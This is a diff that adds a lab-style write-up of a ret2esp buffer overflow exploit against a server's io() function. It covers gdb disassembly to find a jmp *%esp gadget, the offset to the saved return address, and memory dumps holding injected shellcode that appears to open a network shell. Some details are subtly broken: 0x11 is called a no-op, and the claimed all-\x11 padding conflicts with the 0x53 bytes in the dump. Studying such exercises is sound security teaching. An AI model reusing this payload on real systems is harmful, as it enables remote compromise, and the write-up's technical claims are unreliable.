@@ -1,0 +1,57 @@
+The vulnerability in this quesiton is a stack buffer overflow in the function io(). The call to recv() has an erroneous bounds check that allows us to write (6912 << 3) - 6912 = 48384 bytes past the end of the buffer buf[BUFSIZE]. However, ASLR is turned on for this question so we cannot use an absolute address to point to the shellcode. The code segment is always in the same place in memory though so we can access an instruction in there to assist us, namely jmp $esp. An attacker could use this to write malicious shellcode to the system and alter the eip to point to it.
+
+I started by reading the Stack Juggling Methods section in ASLR Smack & Laugh Reference. When I read the section on ret2esp, I noticed that the number 58623 used in one of the examples was also in the code in the function magic(). I used disass magic in the gdb to help locate the address of jmp $esp in the function magic().
+
+(gdb) disass magic
+Dump of assembler code for function magic:
+   ………
+   0x08048619 <+21>:	orl    $0xe4ff,0x8(%ebp)
+   ………
+(gdb) x/i 0x0804861c
+   0x804861c <magic+24>:	jmp    *%esp
+
+Now knowing that the instruction for jmp $esp was 0x0804861c, I decided to do the ret2esp attack.
+
+(gdb) info frame
+ ………
+ Saved registers:
+  ebp at 0xbffff708, eip at 0xbffff70c
+
+(gdb) info frame
+ ………
+ Arglist at 0xbfffdbe8, args: socket=8, n=6912, buf=0xbfffdc00 ""
+ ………
+
+Using gdb, I found that the buffer started at 0xbfffdc00 and that the eip was stored at 0xbffff70c. To perform the ret2esp attack, I decided to overflow the buffer with no-ops to get to the eip, overwrite the eip with instruction for jmp $esp, and put the shellcode right after the eip. This meant that I needed 6924 no-ops to get to the eip. I used \x11 as my no-op. I overwrote the eip with 0x0804861c and followed that with the shellcode. This makes it so that the next instruction is jmp $esp. The esp will then be pointing to the start of the shellcode and will get the shellcode to run. Before finsishing the code, I decided to apply =^ 0x42 to the no-op for consistency.
+
+In the end, I wrote to the buffer 6924 no-ops, followed by the instruction of jmp $esp, followed by the shellcode in that order.
+
+before exploit
+(gdb) x/24x $esp
+0xbfffdbc0:	0x00000008	0xbfffdc00	0x0000d800	0x00000100
+0xbfffdbd0:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbfffdbe0:	0x00000000	0x00000000	0xbffff708	0x08048731
+0xbfffdbf0:	0x00000008	0x00001b00	0xbfffdc00	0x00000000
+0xbfffdc00:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbfffdc10:	0x00000000	0x00000000	0x00000000	0x00000000
+(gdb) x/20x 0xbffff6f0
+0xbffff6f0:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbffff700:	0xb7fd2000	0x00000000	0xbffff768	0x080488cc
+0xbffff710:	0x00000008	0xbffff734	0xbffff730	0xbffff754
+0xbffff720:	0x00000004	0x08049ff4	0x00000002	0x08048465
+0xbffff730:	0x00000010	0xd8b30002	0x0100007f	0x00000000
+
+after exploit
+(gdb) x/24x $esp
+0xbfffdbc0:	0x00000008	0xbfffdc00	0x0000d800	0x00000100
+0xbfffdbd0:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbfffdbe0:	0x00000000	0x00000000	0xbffff708	0x08048731
+0xbfffdbf0:	0x00000008	0x00001b00	0xbfffdc00	0x00000000
+0xbfffdc00:	0x11111111	0x11111111	0x11111111	0x11111111
+0xbfffdc10:	0x11111111	0x11111111	0x11111111	0x11111111
+(gdb) x/20x 0xbffff6f0
+0xbffff6f0:	0x11111111	0x11111111	0x11111111	0x11111111
+0xbffff700:	0x53535353	0x53535353	0x53535353	0x0804861c
+0xbffff710:	0xe3f7db31	0x6a534353	0xb0e18902	0x5b80cd66
+0xbffff720:	0x0268525e	0x6a0a1a00	0x89505110	0x58666ae1
+0xbffff730:	0x418980cd	0xb004b304	0x4380cd66	0x80cd66b0
